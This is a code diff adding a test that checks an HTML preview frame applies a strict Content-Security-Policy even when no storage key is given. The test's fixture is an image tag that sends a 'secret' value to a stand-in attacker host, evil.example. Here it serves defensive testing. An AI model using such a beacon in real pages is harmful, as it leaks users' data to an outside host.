@@ -801,7 +801,13 @@ test('Clear app data remounts the app’s frames empty; a frame with no nameable
   const plain = fakeFrame();
   assert.equal(bridge.mount(plain, { key: '', html: 'code' }), null);
   assert.equal(cfgOf(plain.srcdoc).persist, false);
-  const broken = await bridgeWith({ backend: { ...memoryBackend(), get: async () => { throw new Error('IndexedDB is unavailable'); } } });
+  assert.ok(!plain.srcdoc.includes('Content-Security-Policy'));
+  // v114: a mount with no store still honours strict (a code block's Preview in a thread that read accounts or a file).
+  const strictPlain = fakeFrame();
+  assert.equal(bridge.mount(strictPlain, { key: '', html: '<img src="https://evil.example/c?d=secret">', strict: true }), null);
+  assert.ok(strictPlain.srcdoc.includes(`<meta http-equiv="Content-Security-Policy" content="${STRICT_PREVIEW_CSP}">`), 'the keyless page runs under the strict policy');
+  assert.equal(cfgOf(strictPlain.srcdoc).persist, false);
+  const broken =await bridgeWith({ backend: { ...memoryBackend(), get: async () => { throw new Error('IndexedDB is unavailable'); } } });
   const g = fakeFrame();
   broken.bridge.mount(g, { key: A, html: 'a' });
   await settle();
